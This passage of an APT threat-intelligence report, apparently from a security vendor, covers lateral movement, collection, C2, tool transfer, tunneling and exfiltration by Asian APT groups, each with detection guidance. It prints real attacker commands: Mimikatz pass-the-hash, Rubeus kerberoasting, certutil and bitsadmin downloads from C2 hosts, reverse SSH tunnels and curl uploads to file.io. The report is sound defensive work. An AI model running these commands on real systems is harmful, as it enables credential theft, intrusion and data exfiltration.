unpacking archives residing in a shared network folder and transferring their files to the victim's\nfile system:\n\n\nexpand \\\\<dc_hostname>\\sysvol\\<domain>\\scripts\\oci.zip $system32\\oci.dll\n\n\nexpand \\\\<dc_hostname>\\sysvol\\<domain>\\scripts\\versions.zip $system32\\versions.dll\n\n\n-----\n\n**Example 3**\n\nBAT script in the domain controller shared folder SYSVOL:\n\n\\\\<dc_hostname>\\sysvol\\run.bat\n\n###### Detection\n\nThis technique can be detected based on the profile of the activities within the particular company:\n\n   - How often are GPOs created? Which users can do so?\n\n   - How frequently are GPOs and legitimate scripts modified in SYSVOL? Which users can do so?\n\n   - What other files are shared in SYSVOL? How frequently are they added or modified?\n\nDetection rules will be generated based on the specific activity that is considered normal for the company.\nFor example, creation of a file in the SYSVOL directory will be deemed suspicious in a company in which group\npolicies are extremely rarely created or modified.\n\n\n-----\n\n###### Pass the Hash T1550.002\n\n\n###### Basic description\n\nThe Pass-the-Hash technique enables attackers to move through a network by using the NTLM protocol\nwithout having an actual user password. Instead of a cleartext password, attackers pass the hashes of\npasswords for authentication. Besides the NTLM protocol, attackers may also use Kerberos and implement\nthe Over-Pass-the-Hash technique. Asian APT groups receive these hashes during the Credential Access\nstage. For example, they get them from the address space of the lsass.exe process or from the registry (SAM,\nSECURITY, SYSTEM). Many frameworks, including Cobalt Strike, Crack Map Exec, Mimikatz, and Rubeus, allow\nconducting Pass-the-Hash attacks.\n\n###### Examples of procedures\n\n**Example 1**\n\nWhen analyzing the activity of Asian APT groups, we observed their implementation of the Pass-The-Hash\ntechnique after they successfully dumped password hashes from the lsass.exe process:\n\n\nm.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit > out.txt\nm.exe \"privilege::debug\" \"sekurlsa::pth /user:<REDACTED> /domain:<REDACTED> /ntlm:<REDACTED>\" exit\n\n\nAfter receiving user password hashes and successfully completing authentication, the attackers most\nfrequently used PsExec for a connection on the remote host:\n\n\nPsExec.exe /accepteula \\\\<remote_host> cmd.exe\n\n\n**Example 2**\n\nIn another attack involving an Asian APT group, we observed the use of user hashes in the secretsdump utility\nfrom the Impacket toolset:\n\n\nnat.exe -hashes:<REDACTED> -just-dc <REDACTED>@<REDACTED> -pwd-last-set -user-status -justdc-user <REDACTED>\n\n\n-----\n\n**Example 3**\n\nUsing Rubeus for Kerberoasting:\n\ncmd /C \"C:\\ClusterStorage\\Rubeus.exe -help\"\ncmd /C \"C:\\ClusterStorage\\Rubeus.exe kerberoast\"\ncmd /C \"C:\\ClusterStorage\\Rubeus.exe kerberoast /outfile:hashes.txt\"\ncmd /C \"RENAME C:\\ClusterStorage\\Rubeus.exe C:\\ClusterStorage\\r.exe\"\n\n###### Detection\n\nAlthough it is difficult to guarantee unequivocal detection of the Pass-the-Hash technique using standard\ntools, there are some effective approaches that can detect anomalies in user behavior and system\ninteractions with a certain degree of probability.[15] One of these detection methods, which involves receiving\nevents from two sources (the source host and the target host), is described in the research paper titled \"Pass-\nThe-Hash Detection With Windows Event Viewer\" [16]. You can also track NTLM connections in network traffic. In\na company that has completely migrated to the Kerberos protocol, NTLM authentication may indicate a Pass-\nthe-Hash attack.\n\nAnother way to detect this type of activity is to track the startup of utilities that are intended to receive\nhashes and support NTLM authentication hashes as arguments. Some utilities employ a standard \"-hashes\"\noption for passing hashes.\n\n###### Event source Log Event ID\n\nWindows Security 4688, 4624, 4648, 4672, 4776\n\nSysmon Sysmon 1\n\n15\nFor more details about these approaches, see the Mitigation section.\n\n16\n\nDuplicateDump\n\n[Learn more](https://www.cyberark.com/resources/white-papers/pass-the-hash-detection-using-windows-events)\n\n\n-----\n\n##### Collection TA0009\n\n###### Archive Collected Data T1560\n\n Basic description\n\nIn most of the incidents that we detected, Asian APT groups used a variety of archivers to compress data\nthat was collected from various hosts. The attackers employed this technique before data exfiltration so that\nthey could quickly transfer this data to their C2 server. This technique is also convenient because the required\nsoftware is often already available on the machines of victims. This technique allows forwarding valuable data\nwith minimal risk of detection.\n\n\n-----\n\n###### Archive Collected Data: Archive via Utility T1560.001\n\n\n###### Basic description\n\nAttackers use various data encryption and compression tools that are available in the operating system, and\ndeliver their own tools to infected machines for later use. We identified the top archivers that were used by\nAsian APT groups in the incidents that we detected:\n\n- Winrar\n\n- 7-ZIP\n\n- WinZip\n\n###### Examples of procedures\n\nAs described in the technique known as Masquerading: Match Legitimate Name or Location T1036.005,\nattackers use their own tools disguised as standard system tools. In one example, the Rar.exe archiver was run\nunder the name svchost.exe:\n\n\nC:\\Windows\\ime\\svchost.exe a -r -hpzxcv@wsx -ta20220627 C:\\Windows\\ime\\microsoft.dat c:\\.doc\nd:\\.doc e:\\.doc c:\\.pdf d:\\.pdf e:\\.pdf h:\\.doc h:\\.xls h:\\.pdf f:\\.doc f:\\.xls f:\\.pdf g:\\.doc g:\\.xls g:\\.pdf\n\n\nOne of the distinguishing features in the procedures that we observed among Asian APT groups is their\nmovement of archives to the Recycle Bin (C:\\$Recycle.Bin) before their subsequent exfiltration. We detected\none of these examples in Vietnam:\n\n\n$system32\\cmd.exe /C $programfiles\\Winrar\\Winrar.exe a -r -ta20221020 -n*.doc -n*.docx -n*.xls\n-n*.xlsx -n*.pdf -n*.vsd -n*.vsdx -sl104857600 -hp\"6*A(Zu%s0aC)Seb(B&rpvJa$rcZf6-weTjbFcinrr\"\n$appdata\\%COMPUTERNAME%-%random%.rar C:\\$Recycle.Bin C:\\ D:\\ E:\\ F:\\\n\n\n-----\n\nIn an attack targeting a government agency in a Pacific region country, an Asian APT group also used the RAR\narchiver but this time named it r.exe:\n\n\n$system32\\cmd.exe /c C:\\textar\\EnDeCrypt\\r.exe a -dh -hpaskuernlaos8BDBFKqlwu4bflasld\n-ta20230515 C:\\textar\\ExportData\\20231107Ha.tmp \\\\10.10.10.10\\c$\\users\\random\\downloads\n\n\nAsian threat actors often use the 7zip utility to create archives. Here's an example from the attack targeting a\ncompany in Indonesia:\n\n\n$windir\\Help\\Help\\7z.exe a $windir\\Help\\Help\\tg.7z $windir\\Help\\Help\\1.rar\n\n\nWe observe similar procedures in attacks launched by Asian APT groups against Russian companies:\n\n\nrar a -r 123.rar \\\\10.10.10.10\\c$\\users\\random\\desktop\\* -hp1qaz2wsx3edc4rfv5tgb6yhn -ta20220302\n\"\\\\10.10.10.10\\c$\\Program Files\\winrar\\rar.exe\" a -r -m5 -hp0p;/5tgb1qaz5tgb \\\\10.10.10.10\\c$\\windows\\\ntemp\\sduid.sys \\\\10.10.10.10\\c$\\users\\random\\desktop\\*\n\n\nIn one incident in Russia, we observed the use of the makecab utility. Make Cabinet is a tool that is built into\nWindows operating systems. This tool is used to create and manage compressed archives in Cabinet (CAB)\nformat. Initially, attackers dump registry keys containing user account credentials. Then they pack them into\nZIP archives using the makecab utility:\n\n\n$system32\\makecab.exe \"makecab $public\\videos\\sam.hive $public\\videos\\sa.zip\"\n$system32\\makecab.exe \"makecab $public\\videos\\system.hive $public\\videos\\sy.zip\"\n$system32\\makecab.exe \"makecab $public\\videos\\security.hive $public\\videos\\se.zip\"\n\n\nAttackers also use their own custom-written tools that duplicate the functionality of well-known archivers.\n\n\n-----\n\n###### Detection\n\nYou can detect this technique by tracking process creation events (Event ID 4688 in Windows and Event ID 1 in\nSysmon) and execution of PowerShell script blocks (Event ID 4103 and 4104).\n\nPay attention to the Image field in process creation events and look for popular archivers and/or tools such\nas makecab designed to work with specific file formats. The command line used to start an archiver and the\nimage of the parent process are also important for detection. For example, if console-based tools are not\ntypically used for archiving purposes in your infrastructure, you can effectively track the startup of these tools\nfrom command shells.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Compress Data for Exfiltration via Archiver\n\n   - Sigma-Generic-Archive via PowerShell\n\n   - Sigma-Generic-Windows Shell Started Archive Utility\n\n   - Sigma-Generic-Archive File in Local Users Folders via Makecab.exe\n\n   - Sigma-Generic-Archiving Files in Recycle Bin via Archive\n\n\n-----\n\n###### Automated Collection T1119\n\n\n###### Basic description\n\nAfter gaining access to a system or network, attackers can use automated data collection methods.\nProcedures used for this technique may include ones that are also used for the Command and Scripting\nInterpreter technique to search for and copy information that matches various filters, such as the type,\nname and specific creation dates of files and directories. In a cloud infrastructure, attackers may use APIs or\ncommand-line interfaces.\n\nThis technique may be used in combination with other techniques, such as \"File and Directory Discovery\" and\n\"Lateral Tool Transfer\" to search for and deliver files or \"Cloud Service Dashboard\" and \"Cloud Storage Object\nDiscovery\" to identify hosts in cloud infrastructures. One example of this technique is when an attacker starts\nscripts that automatically collect relevant information from an infected machine.\n\n###### Examples of procedures\n\n**Example 1**\n\nBelow are some examples that we encountered when analyzing the incidents mentioned in the report:\n\n\ndir C:\\\\Users -File -Recurse -Include '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx' | where LastWriteTime -gt $lte |\nsort LastWriteTime -Descending | %{$_.FullName}\nwrite-output $fp1 >> \"$env:tmp\\$hostname\\path.txt\"\n$fp1 | copy-item -Destination \"$env:tmp\\$hostname\" -Force -ErrorAction SilentlyContinue\n\n\n**Example 2**\n\nRecursively searching for files and copying them to a temporary directory using PowerShell:\n\n\nPowerShell.exe \"dir C:\\Users -File -Recurse -Include '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx' | where\nLastWriteTime -gt (Get-date).AddDays(-8) | copy-item -Destination C:\\Users\\public\\tmp -Force\n-ErrorAction SilentlyContinue\n\n\n-----\n\n###### Detection\n\nOne of the ways to detect the Automated Collection T1119 technique is to look for process creation events and\nthe execution of PowerShell script blocks. You should pay close attention to any running utilities or tools that\nwere mentioned above, and analyze the command-line contents (with audit enabled).\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n- Sigma-Generic-Possible wildcard collection sensitive data via PowerShell\n\n- Sigma-Generic-Suspicious Wildcard Searching Data\n\n\n-----\n\n###### Data from Local System T1005\n\n Basic description\n\nAttackers gather various files potentially containing account credentials or other information useful to them,\nand then try to exfiltrate this data from the infected system. To do so, they may use the cmd command-line\nshell or PowerShell, which attackers often automate as we observed above.\n\n###### Examples of procedures\n\n**Example 1**\n\nBelow are some examples that we encountered when analyzing the incidents described above:\n\nxcopy /s $user\\desktop c:\\$recycle.bin\\tempptcl\n\ncmd.exe /C $programfiles\\winrar\\rar.exe a -r -hp1234 C:$recycle.bin\\10020111desk.rar\n$user\\desktop\\*.txt\n$user\\desktop\\*.xls*\n$user\\desktop\\*.pdf\n$user\\desktop\\*.doc*\n$user\\desktop\\*.jpg >\n$temp\\lwefqERM.tmp 2>&1\n\n###### Detection\n\nThe Data from Local System T1005 technique can be detected by tracking process creation events. You\nshould pay close attention to any running utilities or tools that were mentioned above, and analyze the\ncommand-line contents (with audit enabled).\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Possible wildcard collection sensitive data via PowerShell\n\n   - Sigma-Generic-Suspicious Wildcard Searching Data\n\n\n-----\n\n##### Command and Control TA0011\n\n\n###### Application Layer Protocol T1071\n\n\n###### Basic description\n\nMany APT groups use remote command and control centers (C2) in their attacks. Threat actors most\nfrequently use an application-layer protocol to interact with their own servers. This lets them blend in with the\ntraffic among other legitimate connections. Attackers may receive commands from their C2 server and send\nthe results of command execution back to the server.\n\nThe most popular application-layer protocol is HTTP(S). We give some examples of its usage below in the\ndescription of the subtechnique known as Web Protocols T1071.001.\n\n\n-----\n\n###### Application Layer Protocol: Web Protocols T1071.001\n\n\n###### Basic description\n\nAs we already mentioned, the Web Protocols subtechnique is the most popular subtechnique for Command\nand Control. Protocols such as HTTP(S) and WebSocket are extremely popular for transmitting web traffic\nin most companies. HTTP(S) packets contain a multitude of fields and headers that may be concealing data.\nAsian APT groups use these protocols to communicate with their C2 from their victim's network by imitating\nnormal, expected traffic.\n\n###### Examples of procedures\n\n**Example 1**\n\nThe APT group known as ToddyCat communicated with a C2 over the HTTPS protocol. After establishing a\nconnection with its C2 server, a ToddyCat remote access tool (RAT) was able to run on the victim's machine\ncommands received from a remote operator.\n\n\nImage_path: C:\\Windows\\system32\\wusa.exe\n\nURLs:\nhxxps://154.202.56[.]211/collector/3.0/\nhxxps://45.124.115[.]83/collector/3.0/\n\n\n**Example 2**\n\nThe APT group known as CopperTurtle, which primarily conducts attacks in East Asia, also used the HTTPS\nprotocol to interact with their C2. Below is an example of a GET request used to download a backdoor\n(FCDCA94DA890ABCF17FB06C5CD213B37):\n\n\nImage_path: C:\\Program files (x86)\\adobe\\acrobat dc\\acrobat.exe\n\nGET /aall.aspx HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)\nHost: resume.bounceme[.]net:443\nCache-Control: no-cache\n\n\n-----\n\nAfter the backdoor was loaded into memory, it forwarded the information collected about its victim to a C2\nserver. In turn, the specific commands to execute on the victim's system were sent from the C2 server to the\nbackdoor.\n\n**Example 3**\n\nThe backdoor known as PlugX, which is popular among Asian APT groups, also uses the HTTP protocol to\ninteract with a C2 server. Here, the User-Agent string is also masqueraded as a legitimate one:\n\n\nImage_path: “C:\\Program Files (x86)\\HP Digital\\aro.exe”\n\n\nPOST /<random_bytes> HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 10.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)\nHost: rainydaysweb[.]com:8000\nCache-Control: no-cache\n\n**Example 4**\n\nThe Cobalt Strike implant communicates with a C2 server over the HTTP protocol:\n\n\"hxxp://23.224.91[.]98/owa/?path=/calendar&wa=fa5fQcmE_\nqaSqyCFDP6zxAonSbVYV5Zh3velwTIWCJa0F9_nQiAuFdheT70rmBUBq7mnY0b7yR8FnhjNF19EBc7u_\nbvm8uTCEx6rG9kyxOUcFlggjMUzur2tQJ-NmPlFB97t3LPsXdYkbaBiKBdFtbkAXeW9xRdwFuT29FFpays\"\n\n\"hxxp://47.96.167[.]205:8088/owa/?path=/calendar&wa=e89wNPykFLPfHbYB7EZQBa3r5iNVI1xVVTGsRd\nNyDpGe63-4pAmE9ZLjU8ImCUKG8L_JvKk9yN2MsD78LpRmOazvvojXhUow8zQoBVqn-kV-HC-VqmI_2\nBTCqlQHjOBpyMBJyQ3SmBin6xfNZsUkH7_H_Sa79SEA774gG0PGzk8\"\n\n**Example 5**\n\nA file (MD5: 4e43c0ca1feebc1c7107a8ebb53255b9) that was found during an incident investigation uses HTTPS\nto interact with its C2.\n\n\n-----\n\n###### Command name Command description\n\nls Get a list of objects in the specified directory.\n\nexecute Run an arbitrary file or command.\n\ngetcomputername Get the computer's name.\n\n\nupload\n\n\nDownload a file to an infected system and save it with the specified name. Information\nabout the download result is forwarded to the server at mirror-exchange[.]com/upload/\nwith the system ID (GET parameter \"id\"), file name and error code (GET parameter \"file\")\nspecified.\n\n\nexit Terminate the backdoor.\n\n###### Detection\n\nAll of the analyzed examples attempt to look legitimate, which makes detection of the Application Layer\nProtocol: Web Protocols T1071.001 technique more difficult.\n\nMalicious activity related to communication with C2 is detected primarily by conducting a Suricata-based\nsignature analysis of traffic in IDS/IPS systems. Kaspersky Anti Targeted Attack Platform includes network\ntraffic analysis (NTA) and has a built-in Suricata rules database. The IDS rule sets are automatically and\npromptly updated. KATA also uses reputation data for URLs linked to the infrastructure of APT groups.\n\nOne of the ways to detect this technique in SIEM systems is to track network connections from trusted\nlegitimate processes such as Microsoft Office and Adobe applications. You can also track the startup of\nconsole-based utilities used for network data transfer (curl, wget).\n\nCompanies can additionally enable threat intelligence (TI) sources to detect interaction with C2 servers.\n\n###### Event source Log Event ID\n\nWindows Security 4688, 5156\n\nSysmon Sysmon 1, 3, 22\n\n\n-----\n\n###### Web Service T1102\n\n\n###### Basic description\n\nThe Web Service T1102 technique uses existing legitimate web services to transfer data between the victim's\ncomputer and a remote system. Popular websites and social networks can be used to effectively conceal\ncommunication with a C2 because hosts on a network are likely already communicating with such sites and\nmedia. Moreover, most web services normally use SSL/TLS encryption, which provides attackers with an\nadditional layer of protection from detection.\n\nPopular social networks or cloud services are most frequently used for C2 communication. We know of several\nexamples of Asian APT groups abusing publicly accessible cloud storage.\n\n###### Examples of procedures\n\n**Example 1**\n\nIn the WebDav-O attacks, attackers developed a method of C2 communication using the popular cloud\nstorage services of Dropbox, Yandex, and Mail.\n\nCommands intended for the implant were stored in files residing in cloud storage. The implant also forwarded\ncommand execution results to cloud storage.\n\n\nImage_path: C:\\Windows\\system32\\svchost.exe\nURL host: “webdav.yandex.ru”\n\n\nTo access the storage, the implant code included the account credentials required for negotiating the\nencryption key. Files containing commands were encrypted with this key.\n\n**Example 2**\n\nGitHub is also a popular option for a C2 server. For example, the PlugX backdoor was downloaded from GitHub:\n\n\n“$system32\\cmd.exe” /c bitsadmin /transfer n\nhttps://raw/githubusercontent.com/tellyou123/1/master/aro.dat $temp\\aro.dat >\nC:\\inetpub\\wwwroot\\aspnet_client\\1.txt\n\n\n-----\n\n###### Detection\n\nTo detect the Web Service technique, you must track network requests that are sent to popular web services\nsuch as cloud storages, GitHub, social media networks, and various messengers like Telegram or Discord\nfrom processes that normally do not communicate with such services. In a correlation rule, you can filter\napplications used to work with the cloud and other services, as well as popular web browsers. Customized\nexclusions and filters can be configured for each company, and appropriate correlation rules must be trained\naccordingly.\n\nDo not forget that malicious files can masquerade as legitimate processes by using various techniques, such\nas Process Injection T1055, Masquerading T1036, and Hijack Execution Flow T1574. To detect these techniques,\nplease refer to the corresponding sections describing these techniques.\n\n###### Event source Log Event ID\n\nWindows Security 4688, 5156\n\nSysmon Sysmon 1, 3, 22\n\n###### SIGMA rules\n\n   - Sigma-Generic-Network Connection to Cloud Storage\n\n   - Sigma-Generic-Network Connection to Cloud Storage in Command Line\n\n\n-----\n\n###### Ingress Tool Transfer T1105\n\n\n###### Basic description\n\nAsian APT groups download malicious files in several stages during their attacks. Second-stage malware is\ndownloaded to a target host from a C2 server that stores malicious files for subsequent stages as well as\nauxiliary tools for supporting an attack.\n\nFiles are also transferred using various web services (as described above) or other systems available to the\nattacker. In Windows, attackers can use various file download tools, such as certutil, bitsadmin, and PowerShell.\n\n###### Examples of procedures\n\n**Example 1**\n\nIn the Indonesian incident, a backdoor was downloaded using the legitimate Windows tool named certutil.exe\n(LOLBin):\n\n\nC:\\Windows\\system32\\cmd.exe /c certutil -urlcache -split -f hxxp://8.210.141[.]104:8099/MEUpdate.exe\nC:\\Windows\\Help\\Help\\MEUpdate.exe\n\n\nAttackers also used the PowerShell cmdlet Invoke-WebRequest (alias iwr) to download a malicious file:\n\n\nC:\\Windows\\system32\\cmd.exe /c PowerShell iwr -Uri hxxp://8.210.141[.]104:8099/1.txt -OutFile c:\\1.txt\n-UseBasicParsing\"\n\n\n**Example 2**\n\nThe Ingress Tool Transfer T1105 technique was also used in the attack on Pakistan involving the ShadowPad\nand PlugX backdoors. In this case, the APT group downloaded a backdoor from GitHub using bitsadmin:\n\n\n-----\n\nC:\\Windows\\system32\\cmd.exe /c bitsadmin /transfer n\nhttps://raw/githubusercontent.com/tellyou123/1/master/aro.dat $temp\\aro.dat >\nC:\\inetpub\\wwwroot\\aspnet_client\\1.txt\n\n\nAnother example from this incident demonstrates the use of the PowerShell cmdlet Start-BitsTransfer. In\nthis case, the second-stage Stowaway implant is extracted as follows:\n\n\nPowerShell \"Start-BitsTransfer -Source hxxp://security.lomiasecure[.]net/crx/node.txt -Destination\nC:\\\\users\\\\public\\\\node.txt -transfertype download\"\nPowerShell if($InputString = Get-Content 'C:\\\\users\\\\public\\\\node.txt') {\n\n[System.IO.File]::WriteAllBytes('C:\\\\users\\\\public\\\\node.exe',[System.\nConvert]::FromBase64String($InputString) ) }\n\n\n**Example 3**\n\nIn Incident 4 that we analyzed, the APT group ToddyCat used its own RAT to download additional tools to the\nvictim's computer. These tools included a data collection script and an archiver.\n\n###### Detection\n\nTo detect the Ingress Tool Transfer T1105 technique, you must track network connections (for example, those\ninvolving Sysmon Event ID 3) and process creation events.\n\nOne detection approach is to track network interactions from legitimate trusted processes, such as Microsoft\nOffice and Adobe ones.\n\nAs described above, you can create correlation rules for network requests that are sent to popular web\nservices such as cloud storages, GitHub, social networks, and various messengers like Telegram or Discord\nfrom the processes that normally do not communicate with such services. Another way is to track the startup\nof console-based utilities that enable downloading of files from external systems:\n\n- PowerShell\n\n- Curl\n\n- Certutil\n\n- Bitsadmin\n\n- and many others\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 3\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\n###### SIGMA rules\n\n   - Sigma-Generic-Network Connection to Cloud Storage\n\n   - Sigma-Generic-Network Connection to Cloud Storage in Command Line\n\n   - Sigma-Generic-Ingress Tool Transfer via certutil\n\n   - Sigma-Generic-Ingress Tool Transfer via curl.exe\n\n   - Sigma-Generic-File Download via Bitsadmin\n\n   - Sigma-Generic-Execution of Downloaded PowerShell Code\n\n\n-----\n\n###### Protocol Tunneling T1572\n\n Basic description\n\nAttackers tunnel traffic from or to target systems. This lets them conceal their original protocol by wrapping\nit with another protocol to bypass the security measures (NAT and firewall) of the target company for lateral\nmovement through the network or communication with C2. Protocol Tunneling is also used for access to\nnetwork segments/resources that can only be accessed by connecting from an internal network of the\ncompany (Pivoting).\n\nA typical example of tunneling is SSH port forwarding. Attackers use it to exchange information over an\nencrypted SSH channel.\n\n###### Examples of procedures\n\n**Example 1**\n\nIn one attack, an Asian APT group used SSH tunneling (port forwarding) to communicate with a C2 server.\nAttackers used the plink.exe utility (in the command below, ppp.exe is a copy of plink):\n\nppp.exe -c -n -r 45693:10.10.11.15:22 user@202.21.116.154 -p 443 -pw password\n\nAfter the command is executed, the traffic received by port 45693 of the attacked host is forwarded to port\n22 of host 10.10.11.15. The APT group uses a port that is not typical for SSH (the \"-p 443\" option), therefore the\nconnection with C2 will look like a normal connection over HTTPS at first glance. The figure below illustrates the\ninteraction between hosts:\n\nFigure 66 Interaction between hosts via SSH tunneling\n\nPor 443\n\n###### Attacker Host Compromised system 10.11.11.15\n\nPor 45693 Por 22\n\n\n-----\n\nThis scheme allows attackers to gain remote access to an internal resource over SSH.\n\n**Example 2**\n\nHere's another example of an SSH tunnel that is established on a schedule:\n\n\"C:\\Program Files\\OpenSSH\\ssh.exe\" -i C:\\Windows\\AppReadiness\\read.ini -o\nStrictHostKeyChecking=accept-new -R 50846:localhost:7070 systemtest06@103.27.202[.]85 -p 22222\n-fN\n\nIn this case, a reverse SSH connection is established from the localhost to the attackers' C2 server\n103.27.202[.]85:22222. Inbound traffic to the localhost via port 50846 is forwarded to port 7070. An application\nlistens to port 7070 on the localhost:\n\nCommand_line: “C:\\Intel\\gxfintel.exe init”\nMD5: F2FD1AB5E8ABDF2201D7B47F3BB14758\n\n\n-----\n\nOther variants:\n\n###### MD5 File name\n\nC1A23D88B4665D0CF891C1173D6547B1 \"C:\\Windows\\visio.exe\" run\n\n906A35ECFB29080200588BC7507BE114 \"C:\\Windows\\System32\\Office_Deployment.exe\" connect\n\n62FC592D2D7A81E15177EB707BFE7F93 \"C:\\Windows\\apppatch\\App.exe\" debug\n\n25C6363506A36378A9112B849106D5F8 \"C:\\Windows\\system32\\Office_setup.exe\" start\n\n812B6213326341DE4E602D27F18B5AFF C:\\Programdata\\Adobe\\Adobe.exe update\n\nDEEDEEA099AD1A00E46885D05C3F2EA3 C:\\Users\\public\\n.exe init\n\nCreating a scheduled tunnel to port 445:\n\n\nschtasks /create /tn \\Microsoft\\Windows\\Serv /tr \"C:\\PROGRA~1\\OpenSSH\\ssh.exe -i\nC:\\Windows\\AppReadiness\\log.dat -o StrictHostKeyChecking=accept-new -R 50845:localhost:445\nsystemtest05@103.27.202[.]85 -p 22222 -fN\" /ru system /sc minute /mo 20 /f\n\n\n**Example 3**\n\nIn another attack, an Asian APT group used the NATBypass utility, which is a tunnel forwarding tool intended\nfor accessing the internal network of an infrastructure from the outside. We also noticed the iox[17] utility being\nused for port forwarding and traffic proxying.\n\n17\n\niox\n\n\n[Learn more](https://github.com/EddieIvan01/iox)\n\n\n-----\n\n###### Detection\n\nThis technique can be detected with standard telemetry tools (Windows Events, Sysmon) by tracking typical\ncommand-line patterns in process creation events. Attack activity can also be detected by tracking network\nconnection events that show an SSH connection to a non-standard port.\n\nYou can set up another security beacon that tracks network connections to untrusted addresses or\naddresses with a bad reputation. To implement this protective measure, you must have up-to-date information\nabout the IP addresses and domains of attackers. This type of information is provided by Kaspersky Threat\nData Feeds.\n\n\n[Learn more](https://support.kaspersky.ru/datafeeds/about/13849)\n\n\n###### Event source Log Event ID\n\nWindows Security 4688, 5154\n\nSysmon Sysmon 1, 3\n\n###### SIGMA rules\n\n- Sigma-Generic-Protocol Tunneling via Plink Utility\n\n- Sigma-Generic-Ssh Connection to non-standard port\n\n\n-----\n\n##### Exfiltration TA0010\n\n###### Exfiltration Over Web Service T1567\n\n Basic description\n\nWhen implementing the Exfiltration Over Web Service technique, attackers use legitimate web services for\ndata exfiltration. Connections to popular web services are less noticeable among the normal flow of network\nevents because many users utilize these services. This enables attackers to bypass some security solutions.\nThe typical web services used for exfiltration by attackers include popular cloud services, code repositories\nsuch as GitHub, file sharing services, and messengers such as Telegram.\n\n\n-----\n\n###### Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002\n\n Basic description\n\nCloud storage services are the most convenient services for data exfiltration because a firewall normally\nallows outbound connections to these services and attackers don't need to configure additional rules. Actors\nuse popular services like Google Drive or Dropbox so that their traffic is less noticeable.\n\n###### Examples of procedures\n\n**Example 1**\n\nWhen analyzing the tools used by the APT31 group in their campaigns targeting government agencies\nand military structures in Russia, we encountered the third-stage implant named cl.exe (MD5:\nF8553382DE7E1E349D8E91EDB7C57953) that uses Dropbox to send the files collected on a host.\n\nThe cl.exe file is started by a second-stage implant (MD5: 03C74722A8E6E5E7EA0A5ED0C9F23696).\nIts arguments include the directory from which the archive should be exfiltrated and an API token for\naccessing Dropbox.\n\nPOST request example:\n\nPOST https://content.dropboxapi.com/2/files/upload HTTP/1.1\nAuthorization: Bearer <REDACTED>\nDropbox-API-Arg: {\"path\": \"/DF001/0828475d0828475d\",\"mode\": \"overwrite\"}\nContent-Type: application/octet-stream\nHost: content.dropboxapi.com\nContent-Length: 524\nConnection: Keep-Alive\nCache-Control: no-cache\n\nAPT31 also has samples that use Yandex Disk:\n\nc:\\Windows\\security\\audit\\AuditSvc.exe\nMD5: 5C3A88073824A1BCE4359A7B69ED0A8D\nC:\\intel\\yandex.exe\nMD5: 27C9BB44F6521B770CD4576587A140D5\n\n\n-----\n\nThe passed arguments may include an authentication token, file path, and some other parameters. Startup\nparameters may also be specified in the MyLog.ini configuration file residing in the same directory.\n\nFigure 67 Config file of the implant\n\n**Example 2**\n\nIn one of the incidents described earlier, a \"WebDav-O Yandex\" malware variant was used (MD5:\n21F7A530CB718A32E08D4AE8207F7D4D). This implant allows saving files containing commands to be run on\nthe host and sending the collected data to Yandex Disk. To access the storage, the implant code included the\naccount credentials required for negotiating the encryption key. Files containing commands were encrypted\nwith this key.\n\n\nImage_path: C:\\Windows\\system32\\svchost.exe\nURL: “webdav.yandex.ru”\n\n\n-----\n\nWebDav-O Yandex supports the following run parameters:\n\n###### Command Description\n\nUses the PUT method to upload the file specified as the command argument to Yandex\n\"-upload\"\nDisk.\n\nUses a GET request to download the file specified as the command argument, then uses\n\"-download\"\nthe DELETE method to delete it from the storage repository.\n\n\"-quit\" Resets the internal sleep counter to 1 minute and exits command processing.\n\n\"-setsleep\" Sets the internal sleep counter to the number of minutes specified in the argument.\n\n\"-sleepuntil\" Sets the time of next connection specified in a command argument.\n\ndefault Any other command is handled as \"cmd.exe /c\".\n\n**Example 3**\n\nOne of the new tools used by the ToddyCat group is called Dropbox Uploader, which sends collected data\nto Dropbox. It accepts an access token as an argument and searches the current directory for files with the\nfollowing extensions:\n\n\n.z; .001; .002; .003; .004; .005; .006; .007; .008; .009; .010; .011; .012; .013; .014; .015\n\n\nDropbox Uploader sends the found files to Dropbox and puts them into a folder that is named with the current\ndate and time.\n\n\nPOST /2/files/upload HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/octet-stream\nAccept: */*\nAuthorization: Bearer %Authorization Token%\nUser-Agent: api-explorer-client\nDropbox-API-Arg: {\"path\":\"/%DateTime%/%File%.z\",\"mode\":{\".tag\":\"overwrite\"}}\nContent-Length: 5641797\nHost: content.dropboxapi.com\n\n\n-----\n\n**Example 4**\n\nIn one of the incidents presented earlier, the attackers used the popular file sharing service known as file.io:\n\n\n$system32\\cmd.exe /C curl -F \"file=@$selfpath\\1.rar\" --ssl-no-revoke https://file.io\n\n\nAttackers used the console-based curl utility to send the generated archive to file.io.\n\n###### Detection\n\nTo detect data exfiltration through cloud services, you must track network connections to those services\nfrom processes that do not normally interact with cloud storage services. In a correlation rule, you can filter\napplications used to work with the cloud and popular web browsers. You can configure customized exclusions\nand filters for each specific company.\n\nDo not forget that malicious files can masquerade as legitimate processes by using various techniques,\nincluding the following: Process Injection T1055, Masquerading T1036, Hijack Execution Flow T1574. To detect\nthese techniques, please refer to the sections describing them.\n\n###### Event source Log Event ID\n\nSysmon Sysmon 3\n\n###### SIGMA rules\n\n- Sigma-Generic-Network Connection to Cloud Storage\n\n- Sigma-Generic-Network Connection to Cloud Storage in Command Line\n\n\n-----\n\n###### Exfiltration Over C2 Channel T1041\n\n Basic description\n\nThe Exfiltration over C2 Channel technique is used by attackers for 